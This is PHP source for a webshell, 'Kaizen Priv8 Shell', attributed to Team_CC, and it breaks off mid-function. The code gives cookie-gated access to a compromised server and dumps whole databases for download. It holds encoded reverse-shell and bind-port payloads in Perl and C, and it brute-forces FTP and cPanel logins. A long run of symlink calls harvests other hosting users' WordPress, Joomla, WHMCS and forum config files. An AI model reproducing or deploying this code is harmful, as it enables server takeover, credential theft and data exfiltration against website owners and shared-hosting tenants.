<?php @set_magic_quotes_runtime(0);
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$user = "Kaizen@Team_CC";
$pass = "Kaizen@Team_CC";

$malsite = "https://raw.githubusercontent.com/Kaizen1337/Webshell/master/Team_CC.php";  // Malware Site

$ind = "SGFja2VkIGJ5IEthaXplbiA6OiBUZWFtX0ND=="; // Base64 encoded "Hacked by Kaizen :: Team_CC"
// Dump Database

if($_GET["action"] == "dumpDB")
{
	$self=$_SERVER["PHP_SELF"];
	if(isset($_COOKIE['dbserver']))
	{
		$date = date("Y-m-d");
		$dbserver = $_COOKIE["dbserver"];
		$dbuser = $_COOKIE["dbuser"];
		$dbpass = $_COOKIE["dbpass"];
		$dbname = $_GET['dbname'];
		$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
		
		$file = "Dump-$dbname-$date";
		
		$file="Dump-$dbname-$date.sql";
		$fp = fopen($file,"w");
		
		function write($data) 
		{
			global $fp;
			
				fwrite($fp,$data);
			
		}
		mysql_connect ($dbserver, $dbuser, $dbpass);
		mysql_select_db($dbname);
		$tables = mysql_query ("SHOW TABLES");
		while ($i = mysql_fetch_array($tables)) 
		{
			$i = $i['Tables_in_'.$dbname];
			$create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
			write($create['Create Table'].";\n\n");
			$sql = mysql_query ("SELECT * FROM ".$i);
			if (mysql_num_rows($sql)) 
			{
				while ($row = mysql_fetch_row($sql)) 
				{
					foreach ($row as $j => $k) 
					{
						$row[$j] = "'".mysql_escape_string($k)."'";
					}
					write("INSERT INTO $i VALUES(".implode(",", $row).");");
				}
			}
		}
		
		fclose ($fp);
		
		header("Content-Disposition: attachment; filename=" . $file);   
		header("Content-Type: application/download");
		header("Content-Length: " . filesize($file));
		flush();
		
		$fp = fopen($file, "r");
		while (!feof($fp))
		{
			echo fread($fp, 65536);
			flush();
		} 
		fclose($fp); 
	}
}

?>
<style type="text/css">
<!--
span.headtitle
{ 
	color:#FFFFFF;
	text-decoration:none;
	
}
div.logindiv
{
background-color:#5FC1FE;
width:50%;
border-radius:7px;
margin-top:150px;
-moz-border-radius:25px;
height:410px;
border: solid 1px 
#10445A;
border-radius: 13px;
white;
}
body,td,th {
	color: #10445A;
	font-size: 14px;
}
table.pwdtbl
{
	width:95%;
	background-color:#5FC1FE ;
	-moz-border-radius:10px;
	border-radius:25px;
}
tr.file:hover
{
background-color:#E3E3E3;
}
tr.file
{
	background-color:#5FC1FE ;
	height:12px;
}
td.myfun
{
  display: inline;
  padding: 1px;
  margin: 5px;
  border: 1px solid #10445A;
  border-radius: 4px;
  -moz-border-radius:4px;
}
td.myfun:hover
{
}
input.but {
    border: 1px solid transparent;
    border-radius: 0px;
}
a:link {
	color: #10445A ;
	text-decoration:none;
	font-weight:600;
}
a:hover {
	color:#158ACD ;
	text-decoration:none;
}
font.txt
{
	color: #10445A ;
	text-decoration:none;
	font-size:12px;
}
font.fun
{
	color: #10445A;
}
font.wrtperm
{
	color:#10445A;
}
font.readperm
{
	color:#10445A;
}
font.noperm
{
	color:#10445A;
}
input.upld
{
	border: 1px solid #10445A; 
	background-color: #158ACD;
	font-family: Courier;
	-moz-border-radius:6px;
	width:400;
	border-radius:6px;
}
input.box
{
    border: 1px solid #10445A; 
    background-color: #158ACD ;
    font-family: Courier;
	-moz-border-radius:6px;
	width:400;
	border-radius:6px;
}
input.sbox
{
    border: 1px solid transparent; 
    background-color: transparent;
    font-family: Courier;
	-moz-border-radius:6px;
	width:180;
	border-radius:6px;
}
select.sbox
{
    border: 1px solid #10445A; 
    background-color: #5FC1FE;
    font-family: Courier;
	-moz-border-radius:6px;
	width:180;
	border-radius:6px;
}
select.box
{
    border: 1px solid #10445A; 
    background-color: #5FC1FE;
    font-family: Courier;
	-moz-border-radius:6px;
	width:400;
	border-radius:6px;
}

textarea.box
{
    border: 1px solid #10445A;
    margin-top: 10px;
	-moz-border-radius:7px;
  	background-color: #5FC1FE ;
}
textarea:focus
{
}
body {
	background-color:#158ACD;
}
.myphp table
{ 
	width:100%;
	padding:18px 10px;
	border : 1px solid #10445A;
} 
.myphp td
{ 
	/*background:#10445A; */
	color:#5FC1FE; 
	padding:6px 8px; 
	border-bottom:1px solid #10445A;
	font-size:14px; 
} 
.myphp th, th
{ 
	background:#5FC1FE;
	
} 
-->
</style>
<?php
$back_connect_p="eNqlU01PwzAMvVfqfwjlkkpd94HEAZTDGENCCJC2cRrT1DUZCWvjqk5A/fcs3Rgg1gk0XxLnPT/bsnN60rZYthdKt4vKSNC+53sqL6A0BCuMCEK6EiYi4O52UZSQCkTHkoCGMMeKk/Llbdqd+V4dx4jShu7ee7PQ0TdCMQrDxTKxmTEqF2ANPe/U+LtUmSDdC98ja0NYOe1tTH3Qrde/md8+DCfR1h0/Du7m48lo2L8Pd7FxClqL1FDqqoxcWeE3FIXmNGBH2LMOfum1mu1aJtqibCY4vcs/Cg6AC06uKtIvX63+j+CxHe+pkLFxhUbkSi+BsU3eDQsw5rboUcdermergYZR5xDYPQT2DoFnn8OQIsvc4uw2NU6TLKPTwOokF0EUtJJgFu5r4wlFSRT/2UOznuJfOo2k+l+hdGnVmv4Bmanx6Q==";

$backconnect_perl="eNqlUl9rwjAQfxf8Drcqa4UWt1dLZU7rJmN2tNWXTUps45qtJiVNGf32S9pOcSAI3kNI7vcnd9z1boZlwYdbQoc55llZYFh4o1HA4m8s7G6n2+kXVSHwHmQ4oNfMLSpSXYL9if80dR7kuZYvpW110LzmJMPPiCYZVplup6hRI/CmL25owts8WizVRSWiIPTdyasJn1jknAm2rSjaY0MXca4PBtI/ZpTi+ChXbihJeESooSpZv99vTCAUiwgJ9pe72wykuv6+EVpjVAq2k62mRg2wHFMjCGeLpQna+LZhaSeQtwrNM5Dr+/+hnBMqQHOuiA+q2Qcj63zMUkRlI+cJlxhNWYITeKxgwr9KeonRda01Vs1aGRqOUwaW5ThBnSB0xxzHsmwo1fzBQjYoin3grQrMjyyS2KfwjHC5JYxXDZ7/tAQ4fpTiLFMoqHm1dbRrrhat53rzX0SL2FA=";

$zone="vVRtb9owEP6OxH+4ZhFKWkJg6roqEFS0VStaX1ChmybKB8c5wGpiZ7ZZS6vut8+Gjm5V1r18mPLBuedenrvznV9shQslw4TxsECZVSvVCpt6Wwe983cfxq2Jf1etFJJxDc6lNh+/5E77JyhHUFTq5e6c0CsYH0xgSeZCwDgVegJU5FDidCSuYSTgQmEElhZuBcdGkUFnyDRCxpTuQudCwlucEooSTkmO3e+B8IZpc9xXKy6RnyGGdbbNiQHdmVwUYoO1LEbnIi9grTGiKJB7pO50rLfjG+RAWdYYOqRrzTOh0CNW4SYGVZRkRHorIwtOhfRcEjfbLunEbmKOnR2/Wrl7oLFmY5dYYtPJjQjxVwg/iQVQwkGhLZJfKUjQhEOQWGRLH+5ALRKl5aNbHZp1eO1D7DhtuN80cbwzgYFQ2mTGU/ZIum7QQiH0z6JoKOgV6ijqnx6ObDXKyKagp6qgy/HaGyDKXppKiLvgPJ+oUwdrPRBSW+t9k+JACi1WrpoWjg9CAscbvbn2NbczOBuOIORCs+kyzIlS8BumpwF6lGKhI9gOty/lj3P1oD/HKUqU0b/FDY4Jny3IzI6lDhJZSvFGcI1cB6NlYexIUWSMEs0ED2+Cv2Q1oThS6xvBe8Qi6GXsC5ayml2RQW9miCM4Ebcsy0i422iCZ1asMPRJhm04GfYPYa/RbMNHxlNxreB0BK8aLb805JEZoD9plJshn+l5vD48J10vZbzeqFoqcsJ4K34+0GZEa/ahyEWKcWu/JpEoweO9mpn7nOl4iDxd5er/quvHqyQieEiqtLCBJLOcRMBFQAmdlze0FPwfpW2emBWnLVRl5u69l/b3/hs=";

$bind_port_c="bZJRT9swEIDfK/U/eEVa7WJK0mkPrMukaoCEpnUT8DKVKjK2Q05LbMt2KGzw3+ekKQ0Zfkn83efL3TkHoHhRCYk+Oy9AT/Mvw8FBh1lQdz1YKQhuDyrpxe1/p0UBWwjKo5KBwvULs3ecIp4ziyaTsLkn6O9wgMKqo45yCvPtvnHM6kO0bkEoqOLB0fw3E8KmoJBtQ4LJUisc04jsZJQ0pvR4cZ5eLM+u6dWPr9/Sq+vLs8X3vQcZfucIstJXVqGjuMV26kClGSuheAyZ2hSvgkZbH0K518ph5jXgup1VvCbklVfXOnXNo9ULfLFcnJ5epovlr517C0pgRxHudYkm5L2lKHqIX0ouwhVIVcsfd2iTQyFx/DLLZn4J41waH8Ro328zrcrMMH+TxW+wWZdtLHgZ4Ognc26jrfg0oiddwUomQtxQB3+kzrAh3WimLYYkmkP9exWhC0PmcHhI9kZ7KQibFaxRkqDxjRoT9PTUJTaQ3pl6bYUQj8adb0LWTJWXZntDszU1pM4T9VK4xzDYEo+Ow2UcuxwdwahbOy+0C63v0PNw8PwP";

$bind_port_p="bZFvS8NADMZft9DvkNUxW6hsw5f+wbJVHc5WelUQldK1mTucd6W94cTtu3tpN1DxXS753ZMnyUGnv6qr/oyLfonV0jK77DqYTs/sJlUv4IjbJ5bJ5+Bc+PHVA5zC0IUvwDVXztA9ga1lrmoEJvM3VJqsm8BhXu/uMp2EQeL1WDS6SVkSB/6t94qqrKSSs0+RvaNzqPLy0HVhs4GCI9ijTCjIK8wUQqv0LKh/jYqesiRlFk1T0tTaLErj4J4F/ngce9qOZWrbhWaIzoqiSrlwumT8afDiTULiUj98/NtSliiglNWu3ZLXCoWWOf7DtYUf5MeCL9GhlVimkeU5aoejKAw9RmYMPnc6TrfkxdlcVm9uixl7PSEVUN4G2m+nwDkXWADxzW+jscWS8ST07NMe6dq/8tF94tnn/xSCOP5dwDXm0N52P1FZcT0RIbvhiFnpxbdYO59h5Eup70vYTogrGFCoL7/9Bg==";

if(isset($_COOKIE['hacked']) && $_COOKIE['hacked']==md5($pass))
{
?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> 
<title>Kaizen Priv8 Shell</title>
<script type="text/javascript">
checked = false;
function checkedAll () 
{
    if (checked == false){checked = true}else{checked = false}
	for (var i = 0; i < document.getElementById('myform').elements.length; i++) 
	{
	  document.getElementById('myform').elements[i].checked = checked;
	}
}
</script>

<body>
<?php
	
	$self=$_SERVER["PHP_SELF"];
	$os = "N/D";
	if(stristr(php_uname(),"Windows"))
	{
			$SEPARATOR = '\\';
			$os = "Windows";
			$directorysperator="\\";
			
	}
	else if(stristr(php_uname(),"Linux"))
	{
			$os = "Linux";
			$directorysperator='/';
			
	}
	function Trail($d,$directsperator)
	{
		$d=explode($directsperator,$d);
		array_pop($d);
		array_pop($d);
		$str=implode($d,$directsperator);
		return $str;
	}
	
	function ftp_check($host,$user,$pass,$timeout)
	{
	 $ch = curl_init();
	 curl_setopt($ch, CURLOPT_URL, "ftp://$host");
	 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	 curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	 curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
	 curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
	 curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	 curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	 $data = curl_exec($ch);
	 if ( curl_errno($ch) == 28 )
	 {
	 print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
	 <font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
	 Please Check The Target Hostname .</font></font></b></p>";exit;
	 }
	 else if ( curl_errno($ch) == 0 )
	 {
	  print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Tahoma\"   style=\"font-size: 9pt\"><b><font color=\"#008000\">
	 Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
	 and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";
	 }
	 curl_close($ch);
	}
	
	function cpanel_check($host,$user,$pass,$timeout)
	{
	 global $cpanel_port;
	 $ch = curl_init();
	 //echo "http://$host:".$cpanel_port."<br>";
	 curl_setopt($ch, CURLOPT_URL, "http://$host:" . $cpanel_port);
	 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	 curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	 curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
	 curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	 curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	 $data = curl_exec($ch);
	 if ( curl_errno($ch) == 28 )
	 { print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
	  <font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
	  Please Check The Target Hostname .</font></font></b></p>";exit;}
	  else if ( curl_errno($ch) == 0 ){
	  print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Tahoma\"   style=\"font-size: 9pt\"><b><font color=\"#008000\">
	 Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
	and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";
	 }
	 curl_close($ch);
	}
	
	function syml($usern,$pdomain)
	{
		symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
		symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home2/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
		symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home3/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
		symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home4/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
		symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
